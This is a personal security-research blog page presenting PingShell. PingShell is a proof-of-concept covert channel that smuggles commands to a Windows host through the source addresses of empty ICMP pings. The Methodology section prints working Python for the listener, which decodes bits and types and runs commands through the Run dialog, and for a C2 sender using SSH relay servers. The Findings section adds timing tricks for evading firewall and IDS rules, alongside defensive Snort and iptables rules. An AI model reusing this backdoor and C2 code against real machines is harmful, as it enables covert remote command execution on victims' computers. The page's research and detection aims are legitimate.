<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>PingShell</title>
    <style>
        :root {
            --primary-bg: #1c002b;
            --secondary-bg: #320044;
            --primary-text: #f0e6f9;
            --accent-pink: #ff69b4;
            --accent-purple: #9370db;

            /* additional variables to replace the missing Sass ones */
            --primary-color: #3b1c47;      /* used as a card base / placeholder fallback */
            --text-color: #e0c7e7;         /* general muted text color */
            --muted-color: #bfa4bf;        /* tags / subtle text */
            --link-color: #ff8aff;         /* link / tag highlight */
        }

        /* base */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--primary-bg);
            color: var(--primary-text);
        }

        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 2rem;
            background-color: var(--secondary-bg);
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        h1, h2, h3 {
            color: var(--accent-pink);
            border-bottom: 2px solid var(--accent-purple);
            padding-bottom: 0.5rem;
            margin-top: 2rem;
        }

        a {
            color: var(--accent-pink);
            text-decoration: none;
        }
        a:hover { text-decoration: underline; }

        ul { margin-left: 30px; padding-left: 0; }
        li { margin-left: 30px; padding-left: 0; }

        .navbar {
            background-color: var(--secondary-bg); /* slightly lighter purple */
            padding: 1rem 2rem;
            border-radius: 8px;
            margin-bottom: 2rem;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            text-align: center;
        }

        .navbar ul {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            gap: 2rem;
        }

        .navbar a {
            color: var(--accent-pink);
            font-weight: bold;
            text-decoration: none;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            padding: 0.5rem 1rem;
            border-radius: 6px;
        }

        .navbar a:hover {
            background-color: var(--accent-purple);
            color: var(--primary-text);
            text-shadow: 0 0 6px var(--accent-pink);
        }

        .vidcontainer {
            display: flex;
            padding: 1rem;
            justify-content: center;
        }

        /* Projects grid & cards */
        .project-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
        }

        .project-card {
            background: var(--primary-color); /* deep purple base */
            border: 1px solid #c27ac8; /* soft lavender border */
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            transition: transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 0 10px rgba(194, 122, 200, 0.2);
        }

        .project-card img {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 0.75rem;
        }

        .project-card h2 {
            font-size: 1.2rem;
            color: #ffb3ff; /* light pink text */
            margin-bottom: 0.5rem;
        }

        .project-card p {
            color: var(--text-color);
        }

        /* merged hover behaviour */
        .project-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 10px 30px rgba(43,36,51,0.09);
            border-color: #ff8aff;
        }

        .project-link {
            color: inherit;
            text-decoration: none;
            display: block;
        }

        .project-thumb {
            width: 100%;
            height: 150px;
            object-fit: cover;
            display: block;
            border-radius: 8px;
        }

        /* placeholder if no thumbnail */
        .project-thumb--placeholder {
            background: var(--primary-color);
            color: var(--primary-text);
            height: 150px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 40px;
            border-radius: 8px;
        }

        /* meta */
        .project-meta {
            padding: 0.9rem 1rem 1.2rem;
        }

        .project-title {
            margin: 0 0 0.3rem;
            font-size: 1.05rem;
        }

        /* safe replacement for Sass lighten($text-color, 20%) */
        .project-excerpt {
            margin: 0 0 0.6rem;
            color: rgba(224,199,231,0.9); /* slightly lighter than --text-color */
            font-size: 0.95rem;
        }

        .project-tags {
            font-size: 0.85rem;
            color: var(--muted-color);
        }

        .project-tag {
            color: var(--link-color);
            text-decoration: none;
        }

    </style>
</head>
<body>
    <nav class="navbar">
      <ul>
        

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    <li><a href="/LizasLibrary/">Welcome to Liza's Library üìñ</a></li>
  

  
    <li><a href="/LizasLibrary/AboutMe/">About Me</a></li>
  

  
    <li><a href="/LizasLibrary/contact/">Contact</a></li>
  

  
    <li><a href="/LizasLibrary/skills/">Skills</a></li>
  

  
    <li><a href="/LizasLibrary/projects/">Projects</a></li>
  

  
    <li><a href="/LizasLibrary/tags/">All Project Tags Index</a></li>
  

      </ul>
    </nav>

    <div class="container">
        <h1>PingShell</h1>
        <h1 id="smuggling-data-and-commands-over-empty-pings">Smuggling Data and Commands Over Empty Pings</h1>

<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#methodology">Methodology</a></li>
  <li><a href="#findings">Findings</a></li>
  <li><a href="#conclusion">Conclusions</a></li>
</ul>

<p><a id="introduction"></a></p>
<h2 id="introduction">Introduction</h2>

<p>I have always had a fascination with malware and malicious programs. I enjoy spending my free time reading papers from <a href="https://vx-underground.org/">VX-Underground</a> and playing with samples from <a href="https://virusshare.com/">VirusShare</a>. I like to take them apart with decompilers like Ghidra and try to figure out how they tick.</p>

<p>One day while watching YouTube, I came across a no-jumping challenge for Kirby games. I found it fascinating how the player mastered different mechanics of the game to avoid using its primary mechanic. This got me thinking about how this concept could translate to malware. What would a ‚Äúno jump challenge‚Äù look like for malware? The idea of avoiding a central mechanic while still accomplishing a goal intrigued me, so I set out to create a program that could send data and commands to a remote host using nothing but empty packets. Since the data is transmitted in empty packets, preventing it with simple firewall and IDS rules becomes much more difficult. For that reason, I have developed <a href="PingShell.html">PingSmell</a>. PingSmell can be run as a Daemon that will detect the binary patterns that pingshell uses to transmit commands. Here is the link to the entire repo, however I would like to emphasize <strong>ethical use and testing</strong>. Do not use pingshell outside of lab testing environments, and do not use it on computers you do not own or have informed permission to test. <a href="https://github.com/Eliza-Hofer/PingShell-0.2">PingShell Repository</a></p>

<p><a id="methodology"></a></p>
<h2 id="methodology">Methodology</h2>

<p>PingShell was created to test the viability of smuggling commands over empty <strong>ICMP echo requests</strong>. I took an approach that uses the <strong>source address</strong> of each packet to encode either a <strong>1</strong>, a <strong>0</strong>, or a <strong>trigger signal</strong> to the machine. When the remote host receives a ping from address 1, it encodes a <strong>0</strong> into a binary buffer, and when it receives a ping from address 2, it encodes a <strong>1</strong>. When it receives a ping from address 3, PingShell interprets that as a trigger, telling it to read the binary buffer as text, open a run dialog, and type the command into it.</p>

<p>This first function is the ICMP handler, which does most of the heavy lifting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">icmp_handler</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Processes incoming ICMP Echo Requests and handles data </span><span class="sh">"""</span>
    <span class="k">global</span> <span class="n">binary_buffer</span>

    <span class="k">if</span> <span class="n">pkt</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">ICMP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>  <span class="c1"># Type 8 = Echo Request
</span>        <span class="n">src_ip</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span>

        <span class="k">if</span> <span class="n">src_ip</span> <span class="o">==</span> <span class="n">host_ip</span><span class="p">:</span>
            <span class="k">return</span>  <span class="c1"># Ignore self-pings
</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] ICMP Echo Request received from </span><span class="si">{</span><span class="n">src_ip</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">src_ip</span> <span class="o">==</span> <span class="n">addr1</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s"># Packet matches addr1</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">binary_buffer</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current binary_buffer: </span><span class="si">{</span><span class="n">binary_buffer</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">src_ip</span> <span class="o">==</span> <span class="n">addr2</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s"># Packet matches addr2</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">binary_buffer</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current binary_buffer: </span><span class="si">{</span><span class="n">binary_buffer</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">src_ip</span> <span class="o">==</span> <span class="n">addr3</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s"># Packet matches addr3 (Processing binary data)</span><span class="sh">"</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">binary_buffer</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[DEBUG] Final Binary Buffer Before Conversion: </span><span class="si">{</span><span class="n">binary_buffer</span><span class="si">}</span><span class="s"> (Length: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">binary_buffer</span><span class="p">)</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">binary_to_text</span><span class="p">(</span><span class="n">binary_buffer</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">plaintext</span><span class="p">:</span>
                    <span class="nf">press_windows_r</span><span class="p">()</span>
                    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Ensure Run dialog is active
</span>                    <span class="nf">type_text</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
                    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
                    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                    <span class="nf">execute_payload</span><span class="p">()</span>
                    <span class="n">binary_buffer</span> <span class="o">=</span> <span class="sh">""</span>  <span class="c1"># Clear buffer after execution
</span>                <span class="k">else</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid binary input</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Binary buffer is empty</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Unexpected ICMP packet from </span><span class="si">{</span><span class="n">src_ip</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>This function checks the packet source and appends a 1 or 0 to the binary buffer, or triggers execution.</p>

<p>The next function converts the binary buffer into plaintext:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">binary_to_text</span><span class="p">(</span><span class="n">binary_str</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Converts a binary string to text, ensuring only full bytes are processed </span><span class="sh">"""</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Warning: Incomplete byte detected! Binary length: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">binary_str</span> <span class="o">=</span> <span class="n">binary_str</span><span class="p">[:</span><span class="o">-</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)]</span>  <span class="c1"># Trim off incomplete bits
</span>    
    <span class="k">try</span><span class="p">:</span>
        <span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
        <span class="n">text</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">text</span>
    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Error in binary conversion: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
</code></pre></div></div>

<p>This function ensures only full bytes are processed, avoiding errors caused by dropped packets.</p>

<p>The next important part of this program is the <strong>Command and Control (C2) servers</strong>. This part is how we prepare and transmit the commands. The best way to do this is to have 3 separate servers with ssh configured. These can be cheap, minimal cloud machines, physical servers, tiny little dockers, or even theoretically other pingshells. The main C2 server takes a string input, then converts that string into its binary equivalent, and finally iterates over the binary, logging into and sending a ping from one of the 3 ssh servers depending on whether or not the selected value is a 1 or 0, or the iteration is completed.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">user_input</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Send command: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[DEBUG] User input: </span><span class="si">{</span><span class="n">user_input</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">binary_string</span> <span class="o">=</span> <span class="nf">string_to_binary</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
    <span class="n">file_path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">binary_string.txt</span><span class="sh">"</span>
    <span class="nf">write_binary_to_file</span><span class="p">(</span><span class="n">binary_string</span><span class="p">,</span> <span class="n">file_path</span><span class="p">)</span>
    
    <span class="n">binary_str</span> <span class="o">=</span> <span class="nf">read_binary_from_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">binary_str</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">binary_str</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">binary_str</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">send_ping</span><span class="p">(</span><span class="sh">"</span><span class="s">420.69.96.421</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">send_ping</span><span class="p">(</span><span class="sh">"</span><span class="s">420.69.96.422</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">send_ping</span><span class="p">(</span><span class="sh">"</span><span class="s">420.69.96.423</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

<p>This snippet of my c2 asks the user for a command input, then converts that command into its binary equivalent, and finally iterates over it sending pings from different addresses so that the listener on the other device can interpret it. The connection to these servers looks like this.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_ping</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[DEBUG] Attempting to connect to </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="s"> via SSH</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">ip_address</span> <span class="ow">in</span> <span class="n">credentials</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">credentials</span><span class="p">[</span><span class="n">ip_address</span><span class="p">][</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">credentials</span><span class="p">[</span><span class="n">ip_address</span><span class="p">][</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">ssh_client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="nc">SSHClient</span><span class="p">()</span>
        <span class="n">ssh_client</span><span class="p">.</span><span class="nf">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="nc">AutoAddPolicy</span><span class="p">())</span>
        
        <span class="k">try</span><span class="p">:</span>
            <span class="n">ssh_client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[SUCCESS] Connected to </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">address_register.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
                <span class="n">addresses</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">splitlines</span><span class="p">()</span>
                <span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="n">addresses</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[DEBUG] Sending ping command to </span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="nf">exec_command</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">ping -c 1 </span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="n">ping_output</span> <span class="o">=</span> <span class="n">stdout</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
                    <span class="n">error_output</span> <span class="o">=</span> <span class="n">stderr</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[OUTPUT] Ping result for </span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">ping_output</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">error_output</span><span class="p">:</span>
                        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[ERROR] Ping command error: </span><span class="si">{</span><span class="n">error_output</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">AuthenticationException</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[ERROR] Authentication failed for </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[ERROR] SSH error for </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[ERROR] Error connecting to </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">ssh_client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[DEBUG] Closed SSH connection to </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[ERROR] No credentials found for IP address: </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p><a id="findings"></a></p>
<h2 id="findings">Findings</h2>

<p>While the research is not fully complete I have found that this vector is very difficult to defend against with traditional firewall and IDS rules. PingShell itself functions better than I expected, especially after adding a timer between each ping. The problem I have run into is that you can tweak the time between each ping to either send to render a time based firewall rule obsolete. You can‚Äôt simply drop the 3rd ping in the last minute if you put a minute delay between each packet. This is a double edged sword in the sense that you can sacrifice speed for detectability by adjusting the time between each packet. If you send too many packets too fast you can lose packets or jumble the bits. It can also look like a <strong>DDoS</strong> attempt depending on the size of the payload, however you can consistently send long extensive payloads with a long enough delay between the packets to evade traditional IDS rules. There are 2 confirmed ways to block pingshell‚Äôs communication at the moment, but both methods make it much more difficult to use pings for their intended purpose of speed and up tests. <strong>Option 1</strong>, you can just block all pings, but then you cant ping your box to make sure its up and it may cause gaming issues when playing a game that has an automatic ping test to check the ping between the game server and player. <strong>Option 2</strong> is to block every second ping. An inline <strong>Snort rule</strong> to accomplish this may look like this</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drop icmp any any -&gt; any any (msg:"Dropping every other ICMP Echo Request"; itype:8; threshold: type threshold, track by_src, count 2, seconds 3600; sid:100002;)
</code></pre></div></div>

<p>This rule is quite effective at blocking the data from being transmitted by icmp echo source until you adjust the timer between each ping until after the seconds timer has dropped. In the future I intend to see if I can write a script to avoid this, however, if your environment is linux, you can have up to a 24 hour delay with <strong>iptables</strong> with this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">-N</span> PING_FILTER
iptables <span class="nt">-A</span> INPUT <span class="nt">-p</span> icmp <span class="nt">--icmp-type</span> echo-request <span class="nt">-m</span> recent <span class="nt">--name</span> pingtrack <span class="nt">--update</span> <span class="nt">--seconds</span> 86400 <span class="nt">--rttl</span> <span class="nt">-j</span> DROP
iptables <span class="nt">-A</span> INPUT <span class="nt">-p</span> icmp <span class="nt">--icmp-type</span> echo-request <span class="nt">-m</span> recent <span class="nt">--name</span> pingtrack <span class="nt">--set</span> <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> INPUT <span class="nt">-p</span> icmp <span class="nt">--icmp-type</span> echo-request <span class="nt">-m</span> recent <span class="nt">--name</span> pingtrack <span class="nt">--update</span> <span class="nt">--seconds</span> 86400 <span class="nt">--rttl</span> <span class="nt">-j</span> DROP
</code></pre></div></div>

<p>This rule lasts an entire day meaning to get past this the delay between each ping would have to be longer than a day. The only way to get around this delay would require the attacker to expand the c2 infrastructure and the code of pingshell itself to accept pings from multiple addresses to encode the same bits. If <strong>address rotations</strong> were implemented the firewall and IDS rules would be rendered obsolete. Below I have a video of my findings as well as the command I sent. Because this is a proof of concept I will be using a simple payload to display the windows version and then close it. However considering direct access to the run bar, it is possible to do nearly whatever you want including downloads, or execution of other files. As you can see in the image, I send the command <strong>‚Äúwinver‚Äù</strong> and on the right screen of the video you can see the binary buffer accumulating. When the binary buffer has the full binary of the command you can see the run dialog trigger then type the plaintext of the command and execute. I have left the debug messages in my code so you can visually see each packet coming in and the binary buffer accumulating. Now this version is loud, obvious, and would never make it onto someone‚Äôs computer without intentional modification and malicious action. That said if you are interested in how this type of malware could in theory get onto a target computer you can visit my <a href="impact_analysis.html">Impact Analysis</a> where I go into detail about potential vectors, risks, and security implications of this malicious code.</p>

<p><img src="/LizasLibrary/media/winver.png" alt="winver command sent from c2" /></p>

<div class="vidcontainer">
    <video width="580" height="490" autoplay="" loop="" muted="" controls="">
        <source src="/LizasLibrary/media/PingShellVid.mp4" type="video/mp4" />
        Your browser does not support the video tag.
    </video>
</div>

<p><a id="conclusion"></a></p>
<h2 id="conclusion">Conclusion</h2>

<p>My research demonstrates that it is absolutely possible and viable to use empty <strong>ICMP echo requests</strong> to transmit data and commands to a remote host by using the <strong>source IP</strong> to write data to a buffer to be executed. This data transmission can be prevented with time based firewall rules, but if the attacker is patient enough there is still possibility of getting around these rules by adding a long enough delay. These rules can make the life of an administrator a bit harder, luckily with <strong>PingSmell</strong> these binary patterns can be detected and stopped before commands can be executed.</p>

<hr />

<p>¬© 2025 Eliza Hofer<br />
(I use Arch btw :3)</p>

    </div>
</body>
</html>

